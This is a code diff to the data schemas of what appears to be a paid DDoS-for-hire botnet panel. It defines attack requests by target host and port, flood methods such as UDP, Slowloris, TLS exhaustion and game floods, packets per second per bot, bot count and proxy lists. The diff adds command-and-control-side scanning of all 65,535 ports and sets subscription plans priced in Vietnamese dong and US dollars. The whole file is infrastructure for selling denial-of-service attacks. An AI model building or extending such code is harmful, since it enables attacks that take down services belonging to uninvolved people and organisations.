@@ -16,6 +16,8 @@ class LoginResponse(BaseModel):
     token_type: str = "bearer"
     user_id: str
     role: str
+    trust: bool = False
+    expires_in_days: int = 7
 
 class UserCreate(BaseModel):
     username: str = Field(..., min_length=3, max_length=64)
@@ -90,7 +92,7 @@ class BotThrottle(BaseModel):
 class AttackCreate(BaseModel):
     target_host: str
     target_port: int = Field(..., ge=1, le=65535)
-    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS|HTTP_PROXY|GAME|H2RAPID|WSFLOOD|GRAPHQL)$")
+    method: str = Field(default="PSPE", pattern="^(PSPE|MEGA|TCP|TLS|TLS_EXHAUST|HTTP|SLOWLORIS|GAME)$")
     duration_secs: int = Field(default=60, ge=1, le=3600)
     pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
     bot_count: int = Field(default=1, ge=1, le=100)
@@ -101,6 +103,11 @@ class AttackCreate(BaseModel):
     mega_mode: bool = False
     payload: Optional[str] = None    # base64 game payload for GAME method
     proxies: Optional[str] = None    # proxy list ip:port, one per line
+    # Port scan (C2-side): default False → bot only hits target_port
+    # True → C2 scans 1..65535, sends open_ports list to bots
+    scan_ports: bool = False
+    # Optional: comma-separated ports to always include (e.g. "3389,1433,14443")
+    extra_ports: Optional[str] = None
 
 class AttackOut(BaseModel):
     model_config = ConfigDict(from_attributes=True)
@@ -115,7 +122,6 @@ class AttackOut(BaseModel):
     fragmentation: bool = False
     slowloris: bool = False
     tls_exhaust: bool = False
-    mega_mode: bool = False
     mega_mode: bool = False
     status: str = "pending"
     bot_ids: List[str] = []
@@ -160,7 +166,7 @@ class PlanCreate(BaseModel):
     max_attack_secs: int = 120
     cooldown_secs: int = 300
     max_pps_per_bot: int = 500000
-    allowed_methods: List[str] = ["MEGA","TLS_EXHAUST","HTTP","SLOWLORIS","HTTP_PROXY","GAME","UDP"]
+    allowed_methods: List[str] = ["PSPE","TCP","TLS","HTTP","GAME"]
     price_vnd: int = 10000
     price_usd: float = 0.5
     is_active: bool = True
